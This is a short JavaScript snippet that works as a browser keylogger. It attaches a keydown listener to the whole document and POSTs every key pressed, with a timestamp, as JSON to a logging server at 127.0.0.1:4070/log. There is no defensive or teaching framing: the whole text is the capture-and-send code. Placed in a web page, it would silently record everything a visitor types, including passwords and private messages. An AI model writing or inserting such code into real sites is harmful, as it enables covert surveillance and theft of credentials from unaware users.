// Listen for keystrokes and save to log
document.addEventListener("keydown", function(key){
    fetch("http://127.0.0.1:4070/log", {
        method : "POST",
        headers : { "Content-Type" : "application/json" },
        body : JSON.stringify({
            key: key.key,
            datetime: new Date().toISOString()
        })                    
    });
})
